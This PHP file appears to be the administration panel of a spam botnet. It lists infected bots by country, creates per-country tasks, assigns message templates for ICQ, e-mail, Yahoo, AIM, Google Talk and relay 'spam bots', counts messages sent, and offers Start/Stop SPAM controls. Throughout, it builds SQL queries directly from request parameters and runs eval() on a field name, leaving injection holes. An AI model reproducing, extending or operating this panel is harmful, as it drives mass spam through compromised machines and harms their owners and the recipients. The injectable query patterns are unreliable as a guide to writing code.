<?

include_once('auth.php');


set_magic_quotes_runtime(1);

if(is_readable('html.php')) include_once('html.php');
else die('Could not find HTML library.');

if(is_readable('mycommon.php')) require('mycommon.php');
else die('Could not open configuration file.');

if(is_readable('lang.php')) include_once('lang.php');
else die('Could not find language library.');


$mres = mysql_connect($BOT_DBHOST,$BOT_DBLOGIN,$BOT_DBPASS) or die('Check MySQl Options.'.mysql_error());
if(!mysql_select_db($BOT_DBNAME))
die('<p><font color=#990000>Could not USE MAIN DB</font><br>Mysql message:'.mysql_error().'</p>');




if(array_key_exists('ajax',$_GET)){

	//Creating AJAX-friendly tech.

	require_once "lib/JsHttpRequest/JsHttpRequest.php";
	$JsHttpRequest =& new JsHttpRequest("windows-1251");

	if(isset($_GET['action']))
	parse_action();

	$id = $_GET['id'];


	$_RESULT = array(
	"CURRTMPL"=>get_current_tmpl($id),
	"ZUCURRENT"     => gen_current_inf($id), //'<a href="javascript:doLoad(\'action=bz&id='.$id.'\');">'.$id.rand(2323,23123).'-zz</a>',
	"ZUTASKS"   => gen_zu_task_tbl($id),
	"ZUMESSAGE" => (is_radio_ontmpl($id) ? '' : get_zu_task_inf($id,'Tmessage')),
	"ZULANDS"=>get_zu_land(),
	"ZUID"=>$id
	);

	exit;

};








if(isset($_GET['addzutask']))
add_zu_task($_GET['land']);


if(isset($_POST['ZUID'])){
	$_GET['id'] = $_POST['ZUID'];
	save_zu_task($_POST['ZUID']);
};



$CTRL=2;
$CTRL_ZU=1;

if(!isset($_GET['wohead']))
include_once('head.php');

$msg = '';
$srch = '';











$Ini_ARR = array(
'ZULANDS'=>get_zu_land($mres),
'ZUTASKS'=>gen_zu_task_tbl(),
'ZUCURRENT'=>(isset($_GET['id']) ? gen_current_inf($_GET['id']) : ''),
'ZUMESSAGE'=>(isset($_GET['id']) ? (is_radio_ontmpl($_GET['id']) ? '' : get_zu_task_inf($_GET['id'],'Tmessage')) : ''),
'ZUID'=>(isset($_GET['id']) ? $_GET['id'] : ''),
'CURRTMPL'=>(isset($_GET['id']) ? get_current_tmpl($_GET['id']) : '')
);



HTML_ZUPACHA_CTRL($Ini_ARR);













//functions+++++++++++++++++++++++++++++++++


function  parse_action(){
	global $_GET;

	switch ($_GET['action']){
		case 'deltask':
			delete_zu_task($_GET['id']);
			break;
		case 'startspam':
			stop_spam(0,$_GET['id']);
			break;
		case 'stopspam':
			stop_spam(1,$_GET['id']);
			break;
	};

return '';
};




function  stop_spam($stop,$id){
	global $mres;
	
	$q = "UPDATE `task_zu` SET `Tstop`=".$stop." WHERE `Tid`=".$id." LIMIT 1";	
	mysql_query($q,$mres);
	
	return mysql_affected_rows($mres);
};






function save_zu_task($id){
	global $_POST,$mres;
 $message = $_POST['ZUMESSAGE'];
	

   if($_POST['MSGSEL']=='TMPL'){
    @$message = '#%im:'.$_POST['TMPLIM'].'#%ml:'.$_POST['TMPLMAIL'].'#%sb:'.$_POST['TMPLSB'].'#%cr:'.crc32_from_tmpl($_POST['TMPLIM']).crc32_from_tmpl($_POST['TMPLMAIL']).crc32_from_tmpl($_POST['TMPLSB']);  	
   	  	
   };
 
 
	
	
	$RC = '';
	if(isset($_POST['ZURESETCNT']))
	$RC = ' `Ticq_done`=0,`Tmail_done`=0, `Tgoogle_done`=0, `Taim_done`=0,`Tsbots_done`=0, `Tyahoo_done`=0,  ';

	$q = 'UPDATE `task_zu` SET `Tmessage`="'.$message.'",'.$RC.'`Ttime`='.time(0).' WHERE `Tid`='.$id;

	//echo $q;
	mysql_query($q,$mres);
	return mysql_affected_rows($mres);

};





function add_zu_task($land){
	global $mres,$_GET;

	$q = "INSERT INTO `task_zu`(`Tland`) VALUES('".$land."');";

	mysql_query($q,$mres);

	$q = "SELECT * FROM `task_zu` WHERE `Tland`='".$land."'";
	$row = mysql_fetch_object(mysql_query($q,$mres));
	$_GET['id']= $row->Tid;

	return mysql_affected_rows($mres);

};



function delete_zu_task($id){
	global $mres;

	$q = "DELETE FROM `task_zu` WHERE `Tid`=".$id." LIMIT 1";
	@mysql_query($q);
	return mysql_affected_rows($mres);

};






function get_zu_task_inf($id,$field){
	global $mres;

	$q = "SELECT `".$field."` FROM `task_zu` WHERE `Tid`=".$id;

	$result = mysql_query($q,$mres);
	if(!@mysql_num_rows($result))
	return '';

	$row = mysql_fetch_object($result);

	$ret = '';

	eval("\$ret = \$row->".$field.";");
	return $ret;
};






function get_zu_land(){
	global $BOT_DBTBL,$LNG,$mres;

	$reserv = array();
	$q = "SELECT Tland from `task_zu`";
	$result = mysql_query($q,$mres);
	if(mysql_num_rows($result)){
		while($row = mysql_fetch_object($result)){
			$reserv[]=$row->Tland;
		};
	};
   	 
   	 
	$q = 'SELECT `cnt`,`Flang` FROM (SELECT COUNT(`Flang`) as `cnt`,`Flang` FROM `'.$BOT_DBTBL.'`  Group BY Flang ASC) as `bots` order by `cnt` DESC ;';
	$result = mysql_query($q);
	if(!mysql_num_rows($result))
	return '';


	$ret = '<option checked>- Select -</option>'; //<option>All | All countries</option>
	while($row = mysql_fetch_object($result)){
		$m=0;//tmp value
		for($i=0;$i<count($reserv);$i++){
			if(strtoupper($row->Flang) == strtoupper($reserv[$i])){
                

				//  	$ret .="<option> [TASK_Z] | ".$LNG[strtolower($row->Flang)]." (".$row->cnt.")</option>";
				$ret .= '';
				$m=1;
			};
		};

 
		if(!$m)
		@$ret .="<option value=\"?addzutask&land=".$row->Flang."\"> ".$row->Flang." | ".$LNG[strtolower($row->Flang)]." (".$row->cnt.")</option>";
		

	};

	foreach ($reserv as $rs)
	if($rs=='DEF')
	 $def=1;
	
	if(!isset($def))
	 $ret .="<option value=\"?addzutask&land=DEF\"> DEF | ".$LNG['def']."</option>";

	$ret ="<select name=\"sel_land\" onChange=\"MM_jumpMenu('parent',this,0)\"> ".$ret."</select>";

	return $ret;
};





function gen_current_inf($id){
	global $mres,$LNG;

	$l = strtolower(get_zu_task_inf($id,'Tland'));
	
	if(trim(get_zu_task_inf($id,'Tstop'))==1)
	$ss = '<img src=img/stop_spm.gif>&nbsp;&#8212&nbsp;Blocked&nbsp;|&nbsp;<input name="STOPSPAM" type="button" value="Start SPAM" onClick="doLoad(\'action=startspam&id='.$id.'\');">';
	else
	$ss= '<input name="STOPSPAM" type="button" value="Stop SPAM" onClick="doLoad(\'action=stopspam&id='.$id.'\');">';

	if(!$l)
	return  '&nbsp;';

	$ret = '<img src="img/stat_img/ext_'.$l.'.png" border=0>&nbsp;'.$LNG[$l].'&nbsp;|&nbsp Bots&nbsp;&#8212;&nbsp;'.get_bot_count($l);
	$ret .='&nbsp;|&nbsp;'.$ss;

	return $ret;
};





function get_bot_count($land){
	global $mres,$BOT_DBTBL;

if(strtoupper($land)=='DEF')
 return 'All, except country list.';
	
	$q = 'SELECT count(`Flang`) as cnt FROM `'.$BOT_DBTBL.'` WHERE `FLang`="'.strtoupper($land).'"';

	$res =  mysql_query($q,$mres);
	if(!mysql_num_rows($res))
	return 0;
	$row = mysql_fetch_object($res);
	return $row->cnt;

};






function gen_zu_task_tbl($id=''){
	global $mres,$LNG;

	$q = "SELECT * FROM `task_zu`;";
	$result = mysql_query($q,$mres);


	$ret = "<table width=\"96%\" height=\"100%\" border=\"0\" cellpadding=\"2\" cellspacing=\"2\"> "."\n"
	." <tr> "."\n"
	." <td >&nbsp;</td> "."\n"
	." <td class=\"bhead\">Counry</td> "."\n"
	." <td class=\"bhead\"><img src=\"img/icq_ok.gif\" width=\"16\" height=\"16\" alt=\"Icq messages sended\"></td> "."\n"
	." <td class=\"bhead\"><img src=\"img/mail_ok.gif\" width=\"16\" height=\"16\" alt=\"Mail sended\"></td> "."\n"
	." <td class=\"bhead\"><img src=\"img/yahoo_ok.gif\" width=\"16\" height=\"16\" alt=\"Yahoo!IM sended\"></td> "."\n"
	." <td class=\"bhead\"><img src=\"img/aim_ok.gif\" width=\"16\" height=\"16\" alt=\"AOL AIM sended\"></td> "."\n"
    ." <td class=\"bhead\"><img src=\"img/gtalk_ok.gif\" width=\"16\" height=\"16\" alt=\"Google Talk IM sended\"></td> "."\n"
     ." <td class=\"bhead\"><img src=\"img/spambots_ok.gif\" width=\"36\" height=\"16\" alt=\"Thru other spam bots sended\"></td> "."\n"
	." <td nowrap=\"nowrap\" class=\"bhead\">Action with task </td> "."\n"
	." </tr> "."\n";


	if(!mysql_num_rows($result))
	return  $ret.'<tr><td colspan="9" bgcolor=FFFFFF><div align=center>No tasks</div></td></tr></table>';




	while (@$row = mysql_fetch_object($result)){


		if(trim($row->Tstop)==1)
		$ret .=" <tr> "."\n"
		." <th class=\"file1\" scope=\"row\"><img src=\"img/stat_img/ext_".strtolower($row->Tland).".png\" width=\"14\" height=\"14\" alt=\"".$row->Tland."\"></th> "."\n"
		." <td class=\"file1\"><a href=\"javascript:doLoad('action=edittask&id=".$row->Tid."');\" style='text-decoration: none; color: #606680' >".$LNG[strtolower($row->Tland)]."</a></td> "."\n"
		." <td class=\"file1\" colspan=\"5\"><center><img src=img/stop_spm.gif alt=\"Sending process stoped. \"></center></td> "."\n"
		." <td nowrap=\"nowrap\" class=\"file1\"><a href=\"javascript:doLoad('action=edittask&id=".$row->Tid."');\">Delete</a>&nbsp;".($id==$row->Tid ? '' : "|&nbsp;<a href=\"javascript:doLoad('action=edittask&id=".$row->Tid."');\">Edit</a>")." </td> "."\n"
		." </tr> "."\n";
		else
		$ret .= " <tr> "."\n"
		." <th class=\"file1\" scope=\"row\"><img src=\"img/stat_img/ext_".strtolower($row->Tland).".png\" width=\"14\" height=\"14\" alt=\"".$row->Tland."\"></th> "."\n"
		." <td class=\"file1\"><a href=\"javascript:doLoad('action=edittask&id=".$row->Tid."');\" style='text-decoration: none; color: #606680' >".$LNG[strtolower($row->Tland)]."</a></td> "."\n"
		." <td class=\"file1\">".$row->Ticq_done."</td> "."\n"
		." <td class=\"file1\">".$row->Tmail_done."</td> "."\n"
		." <td class=\"file1\">".$row->Tyahoo_done."</td> "."\n"
		." <td class=\"file1\">".$row->Taim_done."</td> "."\n"
		." <td class=\"file1\">".$row->Tgoogle_done."</td> "."\n"
		." <td class=\"file1\">".$row->Tsbots_done."</td> "."\n"
		." <td nowrap=\"nowrap\" class=\"file1\"><a href=\"javascript:doLoad('action=deltask&id=".$row->Tid."');\">Delete</a>&nbsp;".($id==$row->Tid ? '' : "|&nbsp;<a href=\"javascript:doLoad('action=edittask&id=".$row->Tid."');\">Edit</a>")." </td> "."\n"
		." </tr> "."\n";


	};


	$ret .= '</table>';

	mysql_free_result($result);

	return $ret;

};






//with templates
function get_all_tmpl($type_mail=0,$type=''){
global $mres; 
	
 if($type_mail)
$q = "SELECT * FROM `tmpl_zu` WHERE `Ttype` !='sbs' AND `Ttype` !='sbp' AND `Ttype` !='im' group by `Tname`";
 elseif($type=='sb')
 $q = "SELECT * FROM `tmpl_zu` WHERE `Ttype` !='mp' AND `Ttype` !='ms' AND `Ttype` !='im' group by `Tname`"; 
else 
 $q = "SELECT * FROM `tmpl_zu` WHERE `Ttype`='".$type."' group by `Tname`";

	$ret = array();
	
	$result = mysql_query($q,$mres);
	if(!@mysql_num_rows($result))
	return $ret;


 while ((@$row = mysql_fetch_object($result))){
 	$ret[]=$row->Tname;	
 };
 	
 return $ret;
};





function  get_current_tmpl($id){
global $mres;

$tmpls_im = get_all_tmpl(0,'im');
$tmpls_mail = get_all_tmpl(1,'');
$tmpls_sb= get_all_tmpl(0,'sb');

//if(is_radio_ontmpl($taskid))
$active_tmpl = get_tmpls_from_task($id);


$ret = "<input name=\"MSGSEL\" type=\"radio\" value=\"TMPL\" ".(is_radio_ontmpl($id) ? 'checked' : '').">&nbsp;<a title=\"Currentlly is:"."\n".get_zu_task_inf($id,'Tmessage')."\" style='text-decoration: none; color: #606680' >T</a>emplate message type.<br> "."\n"
." &nbsp;&nbsp;&nbsp;&nbsp;Select Template for IM :<select name=\"TMPLIM\">";


 if(count($tmpls_im)){
 $ret .= "\n".'<option >-select-</option>';
  foreach ($tmpls_im as $t)
   if($t == $active_tmpl['im']){
   $ret .= "\n".'<option value="'.urlencode($t).'" selected>'.$t.'</option>';
   }else
   $ret .= "\n".'<option value="'.urlencode($t).'">'.$t.'</option>';
};

$ret .="</select><br> "."\n"
." &nbsp;&nbsp;&nbsp;&nbsp;Select Template for E-mail :<select name=\"TMPLMAIL\">";

 if(count($tmpls_mail)){
$ret .= "\n".'<option >-select-</option>';
  foreach ($tmpls_mail as $t)
     if($t == $active_tmpl['mail'])
   $ret .= "\n".'<option value="'.urlencode($t).'" selected>'.$t.'</option>';
   else
   $ret .= "\n".'<option value="'.urlencode($t).'">'.$t.'</option>';

};


$ret .="</select><br> "."\n"
." &nbsp;&nbsp;&nbsp;&nbsp;Select Template for Spam bots :<select name=\"TMPLSB\">";


 if(count($tmpls_sb)){
$ret .= "\n".'<option >-select-</option>';
  foreach ($tmpls_sb as $t)
     if($t == $active_tmpl['sb'])
   $ret .= "\n".'<option value="'.urlencode($t).'" selected>'.$t.'</option>';
   else
   $ret .= "\n".'<option value="'.urlencode($t).'">'.$t.'</option>';

};

$ret .= "</select><br><br> "."\n"
."<input name=\"MSGSEL\" type=\"radio\" value=\"MSG\" ".(is_radio_ontmpl($id) ? '' : 'checked').">&nbsp;Simple message type. <br>"."\n";





return $ret;
	
	
};






function get_tmpls_from_task($id){	
$ret =array('im'=>'',
			'mail'=>'',
			'sb'=>'',
			'crc32'=>'');

if(!is_radio_ontmpl($id))
return $ret;

	$msg = trim(get_zu_task_inf($id,'Tmessage'));

$tparr = explode('#%',$msg);

foreach ($tparr as $a){
	
	if(substr($a,0,2)=='im')
	 $ret['im']=urldecode(substr($a,3));
	if(substr($a,0,2)=='ml')
	 $ret['mail']=urldecode(substr($a,3));
	if(substr($a,0,2)=='cr')
	 $ret['crc32']=urldecode(substr($a,3));
	if(substr($a,0,2)=='sb')
	 $ret['sb']=urldecode(substr($a,3));
};
 return  $ret;
};




function crc32_from_tmpl($tname){
global $mres;

$q = "SELECT * FROM `tmpl_zu` WHERE `Tname`='".$tname."'";

$re = @mysql_query($q,$mres);
if(!mysql_num_rows($re))
return 0;

$crc = 0;
while ((@$row = mysql_fetch_object($re))){	
$crc += crc32($row->Tmessage);	
};


return $crc;
};



function is_radio_ontmpl($taskid){

$msg = trim(get_zu_task_inf($taskid,'Tmessage'));

if(strlen($msg)==0)
return false;

if(substr($msg,0,2)=="#%")
return true;
	
};



?>